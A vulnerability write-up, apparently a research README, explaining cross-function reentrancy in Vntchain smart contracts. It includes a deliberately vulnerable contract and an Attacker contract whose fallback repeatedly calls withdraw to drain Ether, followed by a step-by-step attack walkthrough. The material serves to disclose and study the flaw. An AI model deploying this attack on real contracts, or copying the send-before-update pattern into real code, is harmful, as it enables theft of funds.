# Infinite_loop_vulnerabilites

## Vendor
Vntchain Infinite Loop 

## Vulnerability Type
Infinite Loop Bugs

## Abstract
We found a complex but common cross-function attack scenario in Vntchain smart contracts, where an attacker can undesirably reenter a function to steal money. [Vntchain](http://www.vntchain.io/?language=en) is an open-source distributed value network, which uses the Ethereum architecture for reference, and is committed to solving the current problems of high energy consumption, low efficiency and difficult to support large-scale commercial applications. The specific infinite loop scenarios can be abstracted as: (1) with the mechanism of Vntchain smart contracts, the execution of a smart contract will fall into the *fallback* function once the input is empty or error. The *fallback* function probably malicious callbacks the function causing the error. (2) another situation is that there exists a mutual invocation between functions in a single contract. While infinite loop bugs in other programming languages have been well studied, smart contracts with infinite loop bugs have not yet been issued.

## Details
We present the specific steps for a specific infinite loop scenario, which caused by the *fallback* function as shown in the figure below.

<div align=center><img width="350" height="440" src="./images/fallback_call_ring.png"/></div>

Contract *Vulnerable* containing two transfer functions *getBonus* and *withdraw*.
* *getBonus* declares one transfer operation, representing the recipient can claim the bonus.
* *withdraw* declares another transfer operation, making the recipient can withdraw his asset.
```
contract Vulnerable{
  ...
  
  // Each recipient should only be able to claim the bonus once
  function getBonus(address recipient) public {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
              throw;
      }
      totalbalance -= amountToWithdraw;
  }

  function withdraw(uint _amount) public {   
    msg.sender.call.value(_amount)();
    userBalances[msg.sender] -= _amount;
    totalbalance -= _amount;
  }
}
```

Contract *Attacker* containing the *attack* function and the *fallback* function.
* *attack* initates the first attack operation to call the function *getBonus*.
* *fallback* calls the function *withdraw*, causing the reentrancy attack to the contract *Vulnerable*.
```
contract Attacker{
  ...
  
  function attack(){
    vul.getBonus(_owner);
  }

  function () payable{ // fallback function
     count++;
     if(count < 10){
       vul.withdraw(1 ether);
     }
  }
}
```


**Step 1** The contract *Attacker* uses the function *attack* to call the function *getBonus* to obtain the bonus (Ether or money), aiming to initiate the attack. (attack (Attacker) -> getBonus (Vulnerable))

**Step 2** Due to the **Step 1**, the function *getBonus* involves the transfer operation (i.e., recipient.call.value(amountToWithdraw)() == false), which will automatically trigger the fallback function of *Attacker*. (withdraw (Vulnerable) -> fallback (Attacker))

**Step 3** The *fallback* function of contract *Attacker* maliciously invokes the function *withdraw* to withdraw its Ether. (fallback (Attacker) -> withdraw (Vulnerable))

**Step 4** However, the function *withdraw* also trigger the fallback function due to "msg.sender.call.value(_amount)()", which involuntarily triggers the *fallback* function of *Attacker* again. (withdraw (Vulnerable) -> fallback (Attacker))

**Step 5** Similarly, The *fallback* function reenter the contract *Vulerable* by calling the function *withdraw*, causing the recursive calls. By exploiting the reentrant call, the *Attacker* can access to the contract *Vulnerable* to steal Ether until all its Ether is exhausted. (fallback (Attacker) -> withdraw (Vulnerable) -> ...)

## Conclusion
All in all, this reentrancy situation is not uncommon. Attacker makes use of two transfer functions of vulnerable contract to trigger its fallback function, reentering the vulnerable contract to steal money. Since reentrancy can occur across multiple functions, and even multiple contracts, solutions aimed at detecting such reentrancy is also urgently required.

## Reference
https://consensys.github.io/smart-contract-best-practices/known_attacks/
https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21
https://github.com/Messi-Q/Vulnerabilities/blob/master/Reentrancy_cross_function.sol



